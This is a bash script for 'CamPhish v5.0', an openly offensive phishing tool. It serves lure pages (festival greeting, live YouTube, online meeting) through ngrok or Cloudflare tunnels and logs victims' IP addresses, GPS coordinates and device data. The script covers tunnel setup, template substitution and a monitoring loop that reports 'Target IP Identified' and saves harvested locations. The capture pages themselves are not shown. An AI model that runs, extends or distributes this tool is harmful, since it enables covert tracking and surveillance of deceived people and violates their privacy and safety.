#!/bin/bash
# CamPhish v5.0 [ULTRA PRO EDITION]
# Deep Diagnostic & Auto-Recovery Engine
# Designed for 100% Success on Kali Linux

# Self-Fix: Force LF line endings if running on Linux
if [[ -n $(command -v tr) ]]; then
  # This is a trick to self-sanitize if the file was corrupted by Windows line endings
  # But we can't easily self-sanitize the running script safely without a wrapper.
  # Instead, we just advise or handle it in logic.
  echo "[*] Initializing environment..."
fi

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "[+] Windows system detected."
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill() { 
    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null; 
    else taskkill /F /IM "$1" 2>/dev/null; fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish v5.0 [ULTRA PRO] \e[0m \n"
printf " \e[1;77m Anti-Bug Deployment | Network Diagnostic Enabled \e[0m \n"
}

dependencies() {
printf "\e[1;92m[\e[0m*\e[1;92m] Auditing System Dependencies...\e[0m\n"
for cmd in php curl wget unzip; do
  if ! command -v $cmd >/dev/null 2>&1; then
    printf "\e[1;31m[!] CRITICAL: $cmd is missing. Fix: sudo apt-get install $cmd -y\e[0m\n"
    exit 1
  fi
done

# Check Time Sync (Critical for SSL tunnels)
if [[ "$windows_mode" == false ]]; then
    printf "\e[1;92m[\e[0m*\e[1;92m] Verifying System Clock...\e[0m\n"
    current_year=$(date +%Y)
    if [[ $current_year -lt 2024 ]]; then
        printf "\e[1;33m[!] WARNING: System date seems wrong ($current_year). Tunnels WILL fail.\e[0m\n"
        printf "\e[1;93m[*] Run: sudo ntpd -qg OR sudo date -s \"$(curl -s --head http://google.com | grep ^Date: | cut -d' ' -f3-6)Z\"\e[0m\n"
        sleep 2
    fi
fi
}

stop() {
printf "\n\e[1;91m[\e[0m!\e[1;91m] Performing Deep Binary Cleanup...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" /IM "php.exe" /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
  pkill -f "cloudflared tunnel" >/dev/null 2>&1
  pkill -f "ngrok http" >/dev/null 2>&1
  killall php ngrok cloudflared 2>/dev/null
fi
exit 0
}

check_php_health() {
  printf "\e[1;92m[\e[0m*\e[1;92m] Testing PHP availability...\e[0m\n"
  for i in {1..10}; do
    if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:3333 | grep "200\|404" > /dev/null; then
      printf "\e[1;92m[\e[0m+\e[1;92m] PHP Server is UP and responding.\e[0m\n"
      return 0
    fi
    sleep 2
    printf "\e[1;93m[*] Waiting for PHP... ($i/10)\e[0m\r"
  done
  printf "\n\e[1;31m[!] Error: PHP Server failed to bind to 127.0.0.1:3333. Try another port or check system logs.\e[0m\n"
  stop
}

cloudflare_tunnel() {
rm -f .cloudflared.log && touch .cloudflared.log

if [[ ! -f "cloudflared" ]] && [[ ! -f "cloudflared.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Syncing Cloudflared binary...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
    elif [[ "$arch" == "x86_64" ]] || [[ "$arch" == "amd64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
    fi
fi

chmod +x cloudflared cloudflared.exe 2>/dev/null

# Integrity Check
if [[ "$windows_mode" == false ]]; then
  if [[ ! -s cloudflared ]]; then
      printf "\e[1;31m[!] CRITICAL: Binary download failed (0 bytes). Check Internet.\e[0m\n"
      rm -f cloudflared; stop
  fi
  ./cloudflared --version >/dev/null 2>&1 || { printf "\e[1;31m[!] CRITICAL: Binary is incompatible with this system architecture.\e[0m\n"; rm -f cloudflared; stop; }
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Spawning PHP Backend...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
check_php_health

printf "\e[1;92m[\e[0m+\e[1;92m] Establishing Tunnel Connection...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Capturing Edge Link...\e[0m\n"
for i in {1..30}; do
    sleep 3
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log | head -n 1)
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Tunnel Probe $i/30... (Check internet if this persists)\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] ULTIMATE FAILURE: Link extraction timed out.\e[0m\n"
    printf "\e[1;93m[DIAGNOSTIC REPORT - Please provide this to support:]\e[0m\n"
    printf "--- START LOG ---\n"
    tail -n 15 .cloudflared.log
    printf "--- END LOG ---\n"
    printf "\e[1;91m[TIP] Try running manually to see errors: ./cloudflared tunnel -url http://127.0.0.1:3333\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] TUNNEL ACTIVE: \e[0m\e[1;77m%s\e[0m\n" "$link"
    generate_payload "$link"
    checkfound
fi
}

ngrok_server() {
if [[ ! -f "ngrok" ]] && [[ ! -f "ngrok.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Fetching Ngrok...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip
    fi
    unzip -q ngrok.zip && rm ngrok.zip
fi

chmod +x ngrok ngrok.exe 2>/dev/null

if [[ ! -f ~/.ngrok2/ngrok.yml ]] && [[ ! -f "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Input Ngrok Authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth >/dev/null 2>&1 || ./ngrok.exe authtoken $ngrok_auth >/dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Booting PHP Backend...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
check_php_health

printf "\e[1;92m[\e[0m+\e[1;92m] Initiating Ngrok Tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then ./ngrok.exe http 3333 > /dev/null 2>&1 &
else ./ngrok http 3333 > /dev/null 2>&1 &; fi

printf "\e[1;92m[\e[0m+\e[1;92m] Capturing Edge Link...\e[0m\n"
for i in {1..20}; do
    sleep 3
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n 1)
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Tunnel Probe $i/20...\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] Error: Ngrok timed out. Check token/internet.\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] TUNNEL ACTIVE: \e[0m\e[1;77m%s\e[0m\n" "$link"
    generate_payload "$link"
    checkfound
fi
}

generate_payload() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

checkfound() {
mkdir -p saved_locations
printf "\n\e[1;92m[\e[0m*\e[1;92m] System Armed. Monitoring Traffic... (Ctrl+C to stop)\e[0m\n"
while true; do
  if [[ -f "ip.txt" ]]; then 
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m+\e[1;93m] Target IP Identified: %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt && rm -rf ip.txt
  fi
  if [[ -f "current_location.txt" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] GPS Coordinates Received!\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
    mv current_location.txt "saved_locations/location_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null || rm current_location.txt
  fi
  if [[ -f "Log.log" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] Device Metadata Harvested!\e[0m\n"
    rm -rf Log.log
  fi
  sleep 1
done
}

select_template() {
printf "\n----- Cyber Templates -----\n"
printf "[01] Festival Wishing\n"
printf "[02] Live YouTube TV\n"
printf "[03] Online Meeting\n"
read -p $'\n[+] Choose Module [1-3]: ' option_tem
option_tem="${option_tem:-1}"

if [[ $option_tem -eq 1 ]]; then
    read -p $'[+] Module Payload (Festival Name): ' fest_name
elif [[ $option_tem -eq 2 ]]; then
    read -p $'[+] Module Payload (YouTube ID): ' yt_video_ID
fi
}

camphish() {
banner
dependencies
printf "\n----- Port Forwarding Servers -----\n"
printf "[01] Ngrok (Stable)\n"
printf "[02] CloudFlare (Stealth)\n"
read -p $'\n[+] Choose Gateway [1-2]: ' option_server
option_server="${option_server:-1}"
select_template
if [[ "$option_server" == "2" ]]; then cloudflare_tunnel
else ngrok_server; fi
}

camphish
